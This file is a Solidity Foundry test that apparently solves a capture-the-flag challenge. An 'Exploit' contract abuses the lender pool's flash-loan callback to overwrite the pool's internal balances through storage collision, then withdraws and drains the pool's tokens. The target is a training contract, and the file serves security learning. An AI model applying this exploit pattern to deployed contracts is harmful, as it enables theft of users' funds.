// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {InSecureumLenderPool} from "../src/Challenge1.lenderpool.sol";
import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";


contract Challenge1Test is Test {
    InSecureumLenderPool target; 
    IERC20 token;

    address player = makeAddr("player");

    function setUp() public {

        token = IERC20(address(new InSecureumToken(10 ether)));
        
        target = new InSecureumLenderPool(address(token));
        token.transfer(address(target), 10 ether);
        
        vm.label(address(token), "InSecureumToken");
    }

    function testChallenge() public {        
        vm.startPrank(player);

        /*//////////////////////////////
        //    Add your hack below!    //
        //////////////////////////////*/

        //=== this is a sample of flash loan usage
        /**FlashLoandReceiverSample _flashLoanReceiver = new FlashLoandReceiverSample();

        target.flashLoan(
          address(_flashLoanReceiver),
          abi.encodeWithSignature(
            "receiveFlashLoan(address)", player
          )
        );*/
        //===

        //============================//
        Exploit attacker = new Exploit(address(token));
        uint256 amount = token.balanceOf(address(target));
        target.flashLoan(
          address(attacker),
          abi.encodeWithSignature(
            "receiveFlashLoan(uint256,address)", amount, address(attacker)
          )
        );
        attacker.pwn(address(target),amount);

        vm.stopPrank();

        assertEq(token.balanceOf(address(target)), 0, "contract must be empty");
    }
}


/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
////////////////////////////////////////////////////////////*/

// @dev this is a demo contract that is used to receive the flash loan
contract FlashLoandReceiverSample {
    IERC20 public token;
    function receiveFlashLoan(address _user /* other variables */) public {
        // check tokens before doing arbitrage or liquidation or whatever
        uint256 balanceBefore = token.balanceOf(address(this));

        // do something with the tokens and get profit!

        uint256 balanceAfter = token.balanceOf(address(this));

        uint256 profit = balanceAfter - balanceBefore;
        if (profit > 0) {
            token.transfer(_user, balanceAfter - balanceBefore);
        }
    }
}

// @dev this is the solution
contract Exploit {

    /// @dev Token contract address to be used for lending.
    //IERC20 immutable public token;
    IERC20 public token;
    /// @dev Internal balances of the pool for each user.
    mapping(address => uint) public balances;

    // flag to notice contract is on a flashloan
    bool private _flashLoan;

    /// @param _token Address of the token to be used for the lending pool.
    constructor (address _token) {
        token = IERC20(_token);
    }
    function receiveFlashLoan(uint256 amount, address attacker) public {
        //_flashLoan = false;
        balances[attacker] = amount;
        //We can approve for the attacker
        //token.approve(attacker,amount);
    }

    function pwn(address _lending, uint256 amount) public {
        InSecureumLenderPool(_lending).withdraw(amount);
        //token.transferFrom(address(_lending), address(this), amount);
    }

}
